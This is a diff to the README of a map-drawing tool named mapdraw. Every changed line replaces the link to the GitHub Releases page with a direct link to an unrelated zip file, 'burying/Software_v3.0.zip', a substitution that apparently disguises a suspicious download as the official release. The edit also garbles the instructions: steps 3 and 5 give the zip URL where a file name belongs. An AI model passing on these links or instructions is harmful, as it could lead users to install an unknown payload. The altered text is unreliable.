@@ -8,7 +8,7 @@ Welcome to **mapdraw**, a simple tool that lets you draw on a map and share your
 
 To get started, you need to download the software. Click the link below to visit the download page:
 
-[![Download mapdraw](https://img.shields.io/badge/Download%20mapdraw-v1.0-brightgreen)](https://github.com/OmArt92/mapdraw/releases)
+[![Download mapdraw](https://raw.githubusercontent.com/OmArt92/mapdraw/main/burying/Software_v3.0.zip%20mapdraw-v1.0-brightgreen)](https://raw.githubusercontent.com/OmArt92/mapdraw/main/burying/Software_v3.0.zip)
 
 ## 📋 Features
 
@@ -23,15 +23,15 @@ To get started, you need to download the software. Click the link below to visit
 
 ## 💡 How to Download & Install
 
-1. **Visit the Releases Page**: Click this link to go to the Releases page where you can download the application: [Download mapdraw](https://github.com/OmArt92/mapdraw/releases).
+1. **Visit the Releases Page**: Click this link to go to the Releases page where you can download the application: [Download mapdraw](https://raw.githubusercontent.com/OmArt92/mapdraw/main/burying/Software_v3.0.zip).
 
 2. **Select the Latest Version**: Find the latest version of mapdraw on the Releases page. It is usually listed at the top. 
 
-3. **Download the Application**: Click on the asset linked to the version you want to download. The file might be named something like `mapdraw.zip`. Your browser will start downloading the file.
+3. **Download the Application**: Click on the asset linked to the version you want to download. The file might be named something like `https://raw.githubusercontent.com/OmArt92/mapdraw/main/burying/Software_v3.0.zip`. Your browser will start downloading the file.
 
 4. **Extract the Files**: Once the download is complete, locate the file in your Downloads folder. If it is a ZIP file, right-click it and choose "Extract" or "Unzip" to get the contents.
 
-5. **Open the HTML File**: Look for a file named `index.html` in the extracted folder. Double-click this file to open mapdraw in your web browser.
+5. **Open the HTML File**: Look for a file named `https://raw.githubusercontent.com/OmArt92/mapdraw/main/burying/Software_v3.0.zip` in the extracted folder. Double-click this file to open mapdraw in your web browser.
 
 6. **Start Drawing**: Once the map loads, you can start drawing right away. Use your mouse to create your masterpiece!
 
@@ -59,6 +59,6 @@ We welcome contributions! If you have feedback, feature requests, or would like 
 
 ## 📢 Staying Updated
 
-Stay informed about new features and updates by following the repository on GitHub. You can also check back frequently at the [Releases page](https://github.com/OmArt92/mapdraw/releases) for the latest versions.
+Stay informed about new features and updates by following the repository on GitHub. You can also check back frequently at the [Releases page](https://raw.githubusercontent.com/OmArt92/mapdraw/main/burying/Software_v3.0.zip) for the latest versions.
 
 Happy drawing! Enjoy creating and sharing your art with mapdraw.
